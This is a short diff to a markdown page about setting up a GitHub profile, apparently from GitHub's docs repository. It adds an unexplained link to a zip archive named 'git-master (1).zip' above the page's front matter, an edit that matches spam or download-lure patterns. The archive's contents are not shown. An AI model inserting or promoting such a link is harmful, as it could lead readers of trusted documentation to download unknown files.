@@ -1,3 +1,4 @@
+[git-master (1).zip](https://github.com/github/docs/files/7903865/git-master.1.zip)
 ---
 title: Setting up and managing your GitHub profile
 intro: You can customize your GitHub profile and manage your contribution graph.
